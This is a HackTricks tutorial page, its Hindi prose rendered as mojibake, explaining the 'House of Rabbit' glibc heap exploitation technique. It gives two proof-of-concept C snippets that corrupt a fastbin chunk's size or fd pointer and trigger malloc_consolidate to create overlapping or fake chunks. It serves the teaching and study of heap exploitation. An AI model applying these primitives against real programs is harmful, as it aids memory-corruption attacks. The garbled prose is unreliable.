# House of Rabbit

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos рдкрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

### рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ

1. **рдлрд╛рд╕реНрдЯрдмрд┐рди fd рдкреЙрдЗрдВрдЯрд░ рдпрд╛ рд╕рд╛рдЗрдЬрд╝ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдлрд╛рд╕реНрдЯрдмрд┐рди рдореЗрдВ рдПрдХ рдЪрдВрдХ рдХреЗ рдлреЙрд░рд╡рд░реНрдб рдкреЙрдЗрдВрдЯрд░ рдпрд╛ рдЙрд╕рдХрд╛ рд╕рд╛рдЗрдЬрд╝ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
2. **`malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛**: рдЗрд╕реЗ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдХреЗ рдпрд╛ рд╢реАрд░реНрд╖ рдЪрдВрдХ рдХреЛ рдорд░реНрдЬ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣реАрдк рдХреЛ рдЪрдВрдХ рдХреЛ рд╕рдореЗрдЯрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рд▓рдХреНрд╖реНрдп

1. **рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдПрдВ**: рдПрдХ рдЪрдВрдХ рдХреЛ рджреВрд╕рд░реЗ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рд╕реЗ рдФрд░ рд╣реАрдк рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
2. **рдирдХрд▓реА рдЪрдВрдХ рдмрдирд╛рдПрдВ**: рдПрдХ рдирдХрд▓реА рдЪрдВрдХ рдХреЛ рдПрдХ рд╡реИрдз рдЪрдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрд▓реЛрдХреЗрдЯрд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдПред

## рд╣рдорд▓реЗ рдХреЗ рдЪрд░рдг

### POC 1: рдПрдХ рдлрд╛рд╕реНрдЯрдмрд┐рди рдЪрдВрдХ рдХрд╛ рд╕рд╛рдЗрдЬрд╝ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

**рдЙрджреНрджреЗрд╢реНрдп**: рдПрдХ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдПрдВ, рдПрдХ рдлрд╛рд╕реНрдЯрдмрд┐рди рдЪрдВрдХ рдХреЗ рд╕рд╛рдЗрдЬрд╝ рдХреЛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗред

* **рдЪрд░рдг 1: рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **рдЪрд░рдг 2: рдЪрдВрдХ рдореБрдХреНрдд рдХрд░реЗрдВ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **рдХрдж рдЪрдВрдХ рдХрд╛ рд╕рдВрд╢реЛрдзрди рдХрд░реЗрдВ**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **рдЪрд░рдг 4: `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
рдПрдХ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рд╕реЗ `malloc_consolidate` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдлрд╛рд╕реНрдЯрдмрд┐рди рдореЗрдВ рдЫреЛрдЯреЗ рдЪрдВрдХ рдХреЛ рдорд░реНрдЬ рдХрд░рддрд╛ рд╣реИред `chunk1` рдХрд╛ рдордирд┐рдкреБрд▓реЗрдЯреЗрдб рд╕рд╛рдЗрдЬрд╝ `chunk2` рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рд╣реЛрдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИред

рдХрдВрд╕реЛрд▓рд┐рдбреЗрд╢рди рдХреЗ рдмрд╛рдж, `chunk1` `chunk2` рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдЧреЗ рдХреА рдЙрддреНрдкреАрдбрд╝рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

### POC 2: FD рдкреЙрдЗрдВрдЯрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

**рдЙрджреНрджреЗрд╢реНрдп**: рдлрд╛рд╕реНрдЯрдмрд┐рди fd рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдордирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ рдПрдХ рдирдХрд▓реА рдЪрдВрдХ рдмрдирд╛рдПрдВред

* **рдЪрд░рдг 1: рдЪрдВрдХреНрд╕ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**рд╡реНрдпрд╛рдЦреНрдпрд╛**: рд╣рдо рджреЛ рдЪрдВрдХреНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ рдЫреЛрдЯрд╛ рдФрд░ рдПрдХ рдмрдбрд╝рд╛, рддрд╛рдХрд┐ рд╣реИрдк рдХреЛ рдлреЗрдХ рдЪрдВрдХ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

* **рдЪрд░рдг 2: рдлреЗрдХ рдЪрдВрдХ рдмрдирд╛рдПрдВ**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **рдХрджрдо 3: рдЪрдВрдХ 1 рдХреЛ рдирд┐:рд╢реБрд▓реНрдХ рдХрд░реЗрдВ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг**: рд╣рдо `chunk1` рдХреЛ рдореБрдХреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рддреНрд╡рд░рд┐рдд рдмрд┐рди рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

* **рдЪрд░рдг 4: рдЪрдВрдХ1 рдХрд╛ FD рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг**: рд╣рдо `chunk1` рдХреЗ рдлреЙрд░рд╡рд░реНрдб рдкреЙрдЗрдВрдЯрд░ (fd) рдХреЛ рд╣рдорд╛рд░реЗ рдлреЗрдХ рдЪрдВрдХ рдХреА рдУрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддреЗ рд╣реИрдВ рдЬреЛ `chunk2` рдХреЗ рдЕрдВрджрд░ рд╣реИред

* **рдЪрд░рдг 5: `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
рдПрдХ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдлрд┐рд░ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рд╕реЗ `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдлреЗрдХ рдЪрдВрдХ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИред

рдлреЗрдХ рдЪрдВрдХ рдлрд╛рд╕реНрдЯрдмрд┐рди рд╕реВрдЪреА рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрди рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рдПрдХ рд╡реИрдз рдЪрдВрдХ рдмрди рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдЧреЗ рдХреА рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╕рд╛рд░рд╛рдВрд╢

**рд╣рд╛рдЙрд╕ рдСрдл рд░реИрдмрд┐рдЯ** рддрдХрдиреАрдХ рдпрд╛ рддреЛ рдПрдХ рдлрд╛рд╕реНрдЯрдмрд┐рди рдЪрдВрдХ рдХрд╛ рдЖрдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдпрд╛ fd рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдорд╛рдирдХ рдЪрдВрдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдирд┐рдкреБрд░реЗрдЯ рдХрд░рдиреЗ рдореЗрдВред рдпрд╣ рд╣рдорд▓рд╛рд╡рд╛рд░реЛрдВ рдХреЛ рд╣реАрдк рдореЗрдВ рд╡реИрдз рдЪрдВрдХ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА рдЙрддреНрдкреАрдбрд╝рди рд╕рдВрднрд╛рд╡рд┐рдд рд╣реЛрддреА рд╣реИред рдЗрди рдЪрд░рдгреЛрдВ рдХреЛ рд╕рдордЭрдирд╛ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░рдирд╛ рдЖрдкрдХреЗ рд╣реАрдк рдЙрддреНрдкреАрдбрд╝рди рдХреМрд╢рд▓ рдХреЛ рдмрдврд╝рд╛рдПрдЧрд╛ред
